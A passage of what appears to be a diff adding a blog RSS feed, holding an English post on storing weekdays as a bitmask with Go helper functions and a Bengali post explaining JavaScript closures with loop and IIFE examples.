+					<comments>/blog/a-smart-way-to-store-weekdays-in-database/#respond</comments>
+		
+		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
+		<pubDate>Wed, 15 Dec 2021 07:55:06 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[Personal]]></category>
+		<category><![CDATA[Technology]]></category>
+		<category><![CDATA[Databases]]></category>
+		<category><![CDATA[Optimization]]></category>
+		<guid isPermaLink="false">/?p=4925</guid>
+
+					<description><![CDATA[Optimization techniques for fast query When we work on a specific problem, We first think of the solution for the worst-case scenario which leads to a brute force approach to solving the problem. This is OK most of the time, as we don&#8217;t get much time to think about an optimal solution due to tight [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p>Optimization techniques for fast query</p>
+<p>When we work on a specific problem, We first think of the solution for the worst-case scenario which leads to a brute force approach to solving the problem. This is OK most of the time, as we don&#8217;t get much time to think about an optimal solution due to tight deadlines. In this blog post, We&#8217;re talking about storing weekdays data model problems. First, we go through the problematic approach &#8211; brute force, then optimize our data model so that we can optimize our database tables for the fast queries.</p>
+<p>Let&#8217;s give a perspective to our problem first, suppose we are developing an application and in our application, we need to manage branches (e.g branches of a restaurant or supermarket) and each branch has its own weekdays.</p>
+<p>So we can design that in an RDBMS database like this, we make a table <code class="inline-code">branches</code> where we store branch-related information and for the weekdays of a specific branch we can store that in a pivot table like <code class="inline-code">branch_weekdays</code> which represents one to many relationships.</p>
+<blockquote><p>Thanks <a title="https://www.linkedin.com/in/rafat-ibn-rashid/" href="https://www.linkedin.com/in/rafat-ibn-rashid/" data-from-md="" rel="nofollow noopener" target="_blank">Rafat Rashid</a> for proofreading my post</p></blockquote>
+<p><img decoding="async" title="" src="///home/rezwanulhaque/.config/joplin-desktop/resources/24724ae100d14517ac91eea376afa4e7.png?t=1638294625651" data-from-md="" data-resource-id="24724ae100d14517ac91eea376afa4e7" alt="24724ae100d14517ac91eea376afa4e7 A Smart Way To Store Weekdays In Database"><img decoding="async" class="alignnone size-full wp-image-4927" src="/wp-content/uploads/2021/12/branch_weekday.png" alt="branch weekday A Smart Way To Store Weekdays In Database" width="756" height="409" srcset="/wp-content/uploads/2021/12/branch_weekday.png 756w, /wp-content/uploads/2021/12/branch_weekday-480x260.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 756px, 100vw"></p>
+<blockquote><p>Note: We&#8217;re storing <code class="inline-code">start_time</code> and <code class="inline-code">end_time</code> in a military format which is why we define the type as <code class="inline-code">int</code></p></blockquote>
+<p>In this design, the pivot table can store the days&#8217; info of a branch which represents one to many relationships. For small data, it&#8217;s completely fine as it&#8217;s not going to be a problem.</p>
+<p>But just think like this, in the worst case if every branch has 7 days as it&#8217;s a weekday in the table then the table becomes one of the major problems when there are a million rows in the branches table which makes the <code class="inline-code">branch_weekdays</code> table 7 times larger than the branches table. If we have several tables like that in our application and we need to join tables to serve some data, this will be a major problem as it will make our query slow when we need to join these tables.</p>
+<h3 id="solutions">Solutions:</h3>
+<p>To solve this problem, we use the binary operation to store the days as a mask in the branches table without managing a separate pivot table like below</p>
+<p><img decoding="async" class="alignnone wp-image-4928 size-full" src="/wp-content/uploads/2021/12/branches.png" alt="branches A Smart Way To Store Weekdays In Database" width="633" height="318" srcset="/wp-content/uploads/2021/12/branches.png 633w, /wp-content/uploads/2021/12/branches-480x241.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 633px, 100vw"></p>
+<div class="joplin-editable">
+<p>Let me explain how we can generate the mask in the branches table. So we all know 7 days makes a whole week and if we flag 0 as Sunday to 6 as Saturday respectively, then we get 0-6 values for each day in a week. While working with binary may initially seem confusing, understanding that each binary place value represents 2<sup class="jop-noMdConv">n</sup>, just as each decimal place represents 10<sup class="jop-noMdConv">n</sup>, should help clarify. Take the number 8 for example:<br />
+<b class="jop-noMdConv"><br />
+8 × 10<sup class="jop-noMdConv">0</sup> = 8 × 1 = 8<br />
+</b><br />
+In binary, 8 is represented as 1000. Reading from right to left, the first 0 represents 2<sup class="jop-noMdConv">0</sup>, the second 2<sup class="jop-noMdConv">1</sup>, the third 2<sup class="jop-noMdConv">2</sup>, and the fourth 2<sup class="jop-noMdConv">3</sup>; just like the decimal system, except with a base of 2 rather than 10.<br />
+<b class="jop-noMdConv"><br />
+2<sup class="jop-noMdConv">0</sup> + 2<sup class="jop-noMdConv">1</sup> + 2<sup class="jop-noMdConv">2</sup> + 2<sup class="jop-noMdConv">3</sup> + 2<sup class="jop-noMdConv">4</sup> + 2<sup class="jop-noMdConv">5</sup> + 2<sup class="jop-noMdConv">6</sup> = 127<br />
+</b><br />
+If we sum the values, we get 127 as the mask value which means the branch is available in seven days. As we&#8217;ll use the bitwise operation to check whether the current day is available or not in the mask value which makes the operation much faster and we&#8217;re able to save a lot of space too. Also, most importantly, we don&#8217;t face a million rows joining problem.</p>
+<p>For this part, I&#8217;ll write the code in <code class="inline-code">Golang</code>, Let me define some utils functions so that we can re-use the code in our application</p>
+<pre><code class="language-go">// Contains check if a `needle` can be found in the `haystack` 
+// e.g.
+// haystack -&gt; []slice
+// needle -&gt; int
+// result -&gt; bool
+func Contains(haystack interface{}, needle interface{}) bool {
+	switch reflect.TypeOf(haystack).Kind() {
+	case reflect.Slice:
+		s := reflect.ValueOf(haystack)
+
+		for i := 0; i &lt; s.Len(); i++ {
+			if reflect.DeepEqual(needle, s.Index(i).Interface()) {
+				return true
+			}
+		}
+	}
+	return false
+}</code></pre>
+</div>
+<div class="joplin-editable"></div>
+<pre><code class="language-go">// GenerateAvailabilityMask covert days slice into binary mask value
+func GenerateAvailabilityMask(days []int) *int {
+    mask := 0
+    for i = 0; i &lt; 7; i++ {
+        if Contains(days, i) {
+            mask += int(math.Pow(2, float64(i)))
+        }
+    }
+
+    return &amp;mask
+}
+
+// input
+// [0,1,2,3,4,5,6]
+// output
+// 127</code></pre>
+<p>We need a function to generate weekdays from the mask as we&#8217;ll return days as a comma-separated string</p>
+<pre><code class="language-go">// GenerateWeekdays convert mask value into weekdays comma separated string
+func GenerateWeekdays(mask int) string {
+	var sb strings.Builder
+	nbits := 7
+	for i := 0; i &lt; nbits; i++ {
+		if IsCurrentDayAvailable(mask, i) {
+			sb.WriteString(strconv.Itoa(i))
+			sb.WriteString(&quot;,&quot;)
+		}
+	}
+	return TrimSuffix(sb.String(), &quot;,&quot;)
+}
+
+// input
+// 127
+// output
+// &quot;0,1,2,3,4,5,6&quot;
+
+// TrimSuffix remove suffix from the string if string ends with the suffix
+func TrimSuffix(s, suffix string) string {
+	if ok := strings.HasSuffix(s, suffix); ok {
+		s = s[:len(s)-len(suffix)]
+	}
+	return s
+}
+
+// IsCurrentDayAvailable check if current weekday is available in availability mask
+func IsCurrentDayAvailable(mask int, currentDay int) bool {
+	x := 1
+	return (mask &amp; (x &lt;&lt; currentDay)) &gt; 0
+}</code></pre>
+<p><code class="inline-code">IsCurrentDayAvailable</code> function is where we apply the <code class="inline-code">bitwise AND (&amp;)</code> operation to find if the current day is available in the mask or not.<br />
+To get the current day we can use the below function</p>
+<div class="joplin-editable">
+<pre><code class="language-go">// CurrentLocalTimeAndWeekday use timezone to get current zone time and weekday and return current weekday &amp; current time in military format 
+func CurrentLocalTimeAndWeekday(tz string) (int, int) {
+	militaryLayout := &quot;1504&quot;
+	loc, err := time.LoadLocation(tz)
+	if err != nil {
+		logrus.Error(&quot;error occurred when trying to find timezone location.&quot;, err)
+		return 0, -1
+	}
+	t := time.Now().In(loc)
+	currentWeekday := int(time.Now().In(loc).Weekday())
+
+	militaryTime, err := strconv.Atoi(t.Format(militaryLayout))
+	if err != nil {
+		logrus.Error(&quot;error occurred when converting time to military integer format.&quot;)
+		return 0, -1
+	}
+	return militaryTime, currentWeekday
+}
+
+</code></pre>
+<p>If you like, you can read the same article on my  [<a href="https://rezwanul-haque.hashnode.dev/a-smart-way-to-store-weekdays-in-database" rel="nofollow noopener" target="_blank">Personal blog</a>]</p>
+<blockquote><p>#### You can read my other blog-posts [<a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">Here</a>]</p></blockquote>
+<p>So after fetching the mask from the branches table, we can use the <code class="inline-code">CurrentLocalTimeAndWeekday</code> utils function to get the current time and weekday and use the <code class="inline-code">IsCurrentDayAvailable</code> function to determine if the current weekday is available or not in the mask. Also if we need to send Mask as weekdays in the response we can use the <code class="inline-code">GenerateWeekdays</code> function to make the mask as an array of weekdays.</p>
+</div>
+<p>In Conclusion, We may not often get enough time to think or come up with an optimized solution in the first go but if we put some thought into the problem, we may come up with solutions that make the database query faster as we reach to million rows.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/a-smart-way-to-store-weekdays-in-database/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>জাভাস্ক্রিপ্টে ক্লোজার কি?</title>
+		<link>/blog/what-is-closer-in-javascript/</link>
+					<comments>/blog/what-is-closer-in-javascript/#respond</comments>
+		
+		<dc:creator><![CDATA[Saroar Shahan]]></dc:creator>
+		<pubDate>Mon, 11 Oct 2021 09:31:01 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<guid isPermaLink="false">/?p=3745</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[<div class="et_pb_section et_pb_section_1 et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_1  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_1  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>জাভাস্ক্রিপ্ট ডেভদের জন্যে একটা আতঙ্কের নাম হচ্ছে closure। এই closure সম্পর্কে পরিষ্কার ধারণা না থাকার কারণে অনেক সময় জব ইন্টার্ভিউতেও পর্যন্ত বেশ ভাল নাকানি-চোবানি খেতে হয়। আমাদের আজকের আলোচ্য বিষয় হচ্ছে closure নিয়ে। তাহলে চলুন শুরু করা যাক এর গোষ্ঠী উদ্ধারের মিশন।</p>
+<h3>ক্লোজার কি?</h3>
+<p>Closure কোন ফাংশন না আবার ফাংশনও কোন closure না। Closure হচ্ছে ফাংশনের এমন একটা বৈশিষ্ট্য যে বৈশিষ্ট্যের কারণে ফাংশন এক্সিকিউশন শেষ হয়ে যাবার পরেও তার lexical scope এ অবস্থিত সকল variable কে মনে রাখতে পারে। উদাহরণস্বরূপ বলা যেতে পারে যে ডম থেকে কিছু অ্যাক্সেস করার জন্যে আমরা যে ইভেন্ট ফাইয়ার করি সেটাও একটা closure।</p>
+<h5>কিছু উদাহরণঃ</h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">function add(a) {
+return function(b) {
+return a + b;
+};
+}
+
+let addTen = add(10);
+let addSeven = addTen(7);
+
+console.log(addSeven); // 17</pre>
+<p>&nbsp;</p>
+<p>কি হচ্ছে এসব?? ঠিক আছে, চলেন দেখি কোডগুলোকে ভেঙ্গেঃ-</p>
+<p>১। যখন add ফাংশনটি কল হয় এটি আরেকটি ফাংশনকে return করে।<br />
+২। ঐ ফাংশনটির এক্সিকিউশন শেষ হয়ে যায় এবং মনে রাখে ঐ সময় তার প্যারামিটার a এর ভ্যালু কি ছিল।<br />
+৩। যখন addTen ভেরিয়েবলে add ফাংশনকে এসাইন করা হয়। এটি সব সময় মনে রাখবে a এর ভেল্যু কি ছিল যখন এটিকে ইনিশিয়ালি কল করা হয়েছিল।<br />
+৪। উপরের addTen ভেরিয়েবল একটি ফাংশনকে বোঝায় যেটি সব সময় ভেল্যু ১০ যোগ করবে যা পাঠানো হয়েছিল।<br />
+৫। তার মানে হল যখন addTen কে কল করা হয় ৭ ভেল্যু দিয়ে, এটি ১০ এর সাথে ৭ যোগ করবে এবং ১৭ রিটার্ন করবে।</p>
+<p>**সুতারং, জাভাস্ক্রিপ্ট ইঞ্জিন addTen কে যেভাবে রান করেঃ-**</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">function addTen(b) {
+return 10 + b;
+}</pre>
+<p>এখন একটা মজার উদাহরণ দেখবো। কিভাবে আমরা লুপের ভিতরে ক্লোজার চালাতে পারি। এটি ইন্টার্ভিউ বোর্ডের একটা কমন প্রশ্ন। নিচের কোডটা দেখেন এবং একটু মনে মনে চিন্তা করেন এটার আউটপুট কত হবে।</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">for(var i = 1; i &lt;= 5; i++) { setTimeout(() =&gt; console.log(i), 1000);
+}</pre>
+<p>&nbsp;</p>
+<h5>কাঙ্ক্ষিত আউটপুটঃ-</h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">1
+2
+3
+4
+5</pre>
+<h5>কিন্তু আসছে অনাকাঙ্ক্ষিত আওউটপুটঃ-</h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">6
+6
+6
+6
+6</pre>
+<p>আসলে এই আউটপুট আসার অনেক কারণ আছে। লুপের মাঝে ভ্যারিয়াবল i হচ্ছে একটি গ্লোবাল ভ্যারিয়াবল। যখন setTimeout রান হয় তার আগেই লুপ শেষ হয়ে যায় এবং তাই i ভ্যালু 6 হয়ে যায়। সেজন্যে প্রতি এক সেকন্ড পর পর পাঁচবার 6 দেখাচ্ছে। যদি বিশ্বাস না হয় তাহলে কোডটা রান করার পর আপনার গ্লোবাল window অবজেক্টটা একবার দেখেন সেখানে i নামে একটা ভ্যারিয়াবল দেখতে পারবেন এবং তার ভ্যালু 6 হয়ে আছে।</p>
+<p>এই সমস্যার সমাধান আমরা IIFE বা Immediately Invoked Function Expression ব্যবহার করে করতে পারি। নিচে উদাহরণ দেওয়া হলঃ-</p>
+<h5>পদ্ধতি ১ঃ-</h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">for(var i = 1; i &lt;= 5; i++) { (function() { var val = i; setTimeout(() =&gt; console.log(val), 1000);
+}());
+}</pre>
+<h5>পদ্ধতি ২ঃ-</h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">for(var i = 1; i &lt;= 5; i++) { (function(val) { setTimeout(() =&gt; console.log(val), 1000);
+}(i));
+</pre>
+<p>&nbsp;</p>
+<p>এখানে আমরা একটা ফাংশন লিখে একটা Scope তৈরি করেছি। ফাংশনটিকে ইমিডিয়েটলি কল করেছি এবং তার প্যারামিটারের ভেল্যু হিসাবে i কে পাস করেছি। এতে সে এখন i এর ভেল্যুকে মনে না রেখে সে এখন তার প্যারামিটারের ভেল্যুকে মনে রাখবে। মানে এখন i এর মান 1, 2 করে যাচ্ছে এবং সেটা থেকে একটা আলাদা Scope তৈরি হচ্ছে যেটাকে সে মনে রাখছে।</p>
+<h5>আউটপুটঃ-</h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">1
+2
+3
+4
+5</pre>
+<p>অবশেষে আমাদের কাঙ্ক্ষিত আউটপুট ফেলাম। তবে আজ এই পর্যন্ত দেখা পরবর্তী অন্য টপিকে। হ্যাপি কোডিং&#8230;</p>
+<p>**বিঃ দ্রঃ** [এখানে ক্লিক](https://shahansdiary.com/what-is-closure-in-javascript/) করে লেখকের ব্যক্তিগত ব্লগেও পড়তে পারবেন</p></div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/what-is-closer-in-javascript/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
